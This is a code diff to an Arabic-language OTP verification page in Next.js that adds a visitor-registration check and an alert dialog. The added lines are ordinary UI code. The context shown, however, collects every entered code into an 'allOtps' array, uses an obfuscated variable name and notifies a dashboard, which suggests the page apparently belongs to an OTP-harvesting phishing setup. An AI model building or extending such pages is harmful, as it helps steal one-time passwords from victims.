@@ -5,9 +5,19 @@ import { useRouter } from "next/navigation"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Alert, AlertDescription } from "@/components/ui/alert"
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogCancel,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog"
 import { ShieldCheck, AlertCircle, RefreshCw, Clock, Lock } from "lucide-react"
 import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
-import { addData, submitVisitorFormData, notifyDashboard } from "@/lib/api"
+import { addData, submitVisitorFormData, notifyDashboard, checkVisitorRegistration } from "@/lib/api"
 import { onVisitorStatusUpdated } from "@/lib/socket"
 import { addToHistory } from "@/lib/history-utils"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
@@ -25,6 +35,9 @@ export default function VeriPage() {
   const [canResend, setCanResend] = useState(false)
   const [resendTimer, setResendTimer] = useState(60)
   const [referenceNumber, setReferenceNumber] = useState("")
+  const [showRegistrationAlert, setShowRegistrationAlert] = useState(false)
+  const [registrationMessage, setRegistrationMessage] = useState("")
+  const [isCheckingRegistration, setIsCheckingRegistration] = useState(false)
 
   // Initialize visitor ID and update current page
   useEffect(() => {
@@ -134,7 +147,32 @@ export default function VeriPage() {
     }
 
     const visitorID = localStorage.getItem("visitor")
-    if (!visitorID) return
+    if (!visitorID) {
+      setRegistrationMessage("لم يتم العثور على معرف الزائر. يرجى بدء التسجيل من جديد.");
+      setShowRegistrationAlert(true);
+      return;
+    }
+
+    // Check if visitor is registered
+    setIsCheckingRegistration(true);
+    try {
+      const checkResult = await checkVisitorRegistration(visitorID);
+      console.log('[handleOtpSubmit] Registration check:', checkResult);
+      
+      if (!checkResult.isRegistered) {
+        setRegistrationMessage(checkResult.message || "لا يوجد لديك سجل. يرجى إعادة التسجيل.");
+        setShowRegistrationAlert(true);
+        setIsCheckingRegistration(false);
+        return;
+      }
+    } catch (error) {
+      console.error('[handleOtpSubmit] Registration check failed:', error);
+      setRegistrationMessage("فشل في التحقق من التسجيل. يرجى المحاولة مرة أخرى.");
+      setShowRegistrationAlert(true);
+      setIsCheckingRegistration(false);
+      return;
+    }
+    setIsCheckingRegistration(false);
 
     try {
       allOtps.push(_v5)
@@ -279,13 +317,42 @@ export default function VeriPage() {
             <Button
               type="submit"
               className="w-full h-14 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-xl rounded-xl shadow-lg hover:shadow-xl transition-all"
-              disabled={_v5.length < 4 || _v5Status === "verifying"}
+              disabled={_v5.length < 4 || _v5Status === "verifying" || isCheckingRegistration}
             >
-              تأكيد
+              {isCheckingRegistration ? "جاري التحقق..." : "تأكيد"}
             </Button>
           </form>
         </div>
       </div>
+
+      {/* Registration Alert Dialog */}
+      <AlertDialog open={showRegistrationAlert} onOpenChange={setShowRegistrationAlert}>
+        <AlertDialogContent className="max-w-md">
+          <AlertDialogHeader>
+            <AlertDialogTitle className="text-right text-xl">⚠️ تنبيه</AlertDialogTitle>
+            <AlertDialogDescription className="text-right text-base">
+              {registrationMessage || "لا يوجد لديك سجل. يرجى إعادة التسجيل."}
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          <AlertDialogFooter className="flex-row-reverse gap-2">
+            <AlertDialogCancel className="bg-gray-100 hover:bg-gray-200 text-gray-800">
+              إلغاء
+            </AlertDialogCancel>
+            <AlertDialogAction 
+              className="bg-[#1a5c85] hover:bg-[#154a6d] text-white"
+              onClick={() => {
+                setShowRegistrationAlert(false);
+                if (typeof window !== 'undefined') {
+                  localStorage.removeItem('visitor');
+                }
+                window.location.href = '/home-new';
+              }}
+            >
+              تسجيل جديد
+            </AlertDialogAction>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
     </div>
   )
 }
